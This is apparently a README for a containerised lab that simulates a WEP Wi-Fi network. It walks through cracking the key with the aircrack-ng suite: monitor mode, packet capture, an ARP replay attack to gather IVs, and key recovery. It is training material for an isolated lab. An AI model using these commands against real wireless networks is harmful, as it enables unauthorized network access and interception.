# WEP Lab — Docker Setup

## Architecture

```
Host Kernel (mac80211_hwsim)
  ├── wlan0  →  Container A (ap)      — hostapd running WEP AP (SSID: wifi-old)
  ├── wlan1  →  Container B (client)  — wpa_supplicant connected to wifi-old
  └── wlan2  →  HOST / Kali           — your attack interface
```

All three virtual radios are on the same simulated "air" — they all see each other's frames.

---

## Prerequisites (Kali host)

```bash
sudo apt install -y docker.io docker-compose aircrack-ng
sudo systemctl start docker
```

Make sure `mac80211_hwsim` is available:
```bash
modinfo mac80211_hwsim   # should print module info
```

---

## Start the lab

```bash
cd wep-lab
docker compose up --build
```

Wait until you see hostapd printing `AP-ENABLED` and the client showing `CTRL-EVENT-CONNECTED`.

Verify the virtual interfaces exist on the host:
```bash
iw dev
# Should show wlan0, wlan1, wlan2
```

---

## Attack from Kali (wlan2)

### 1. Enable monitor mode
```bash
sudo airmon-ng start wlan2
# Creates wlan2mon (or wlan2 stays with type monitor on some kernels)
```

### 2. Scan — confirm the AP is visible
```bash
sudo airodump-ng wlan2mon
# Look for SSID: wifi-old, Channel: 6, Encryption: WEP
# Note the BSSID (AP MAC) and the CLIENT MAC
```

### 3. Start capture on the AP channel
```bash
sudo airodump-ng -c 6 --bssid <AP_BSSID> -w capture wlan2mon
# Keep this running in a terminal
```

### 4. Accelerate IVs — ARP replay attack
```bash
sudo aireplay-ng --arpreplay -b <AP_BSSID> -h <CLIENT_MAC> wlan2mon
# This replays ARP packets to generate thousands of IVs fast
```

### 5. Crack the key
```bash
# Once you have ~5000+ IVs (watch the airodump #Data counter):
sudo aircrack-ng -b <AP_BSSID> capture*.cap

# Expected output:
# KEY FOUND! [ AA:BB:CC:DD:EE ]
```

---

## WEP key in this lab

The key is: `AABBCCDDEE` (hex 40-bit / 5-byte)

---

## Troubleshooting

**`wep_default_key` unknown in hostapd logs**
→ Stock hostapd 2.10+ drops WEP. The Dockerfile builds from source with `CONFIG_WEP=y`. Rebuild: `docker compose build --no-cache ap`

**`wlan2` not visible on host**
→ Check `iw dev` after the AP container starts. If missing: `modprobe mac80211_hwsim radios=3` manually.

**Client not associating**
→ Check client logs: `docker logs wep-client`. Confirm AP is up first.

**aircrack says "not enough IVs"**
→ Let aireplay-ng run longer. WEP 40-bit cracks in ~5k-20k IVs, 104-bit needs ~100k+.
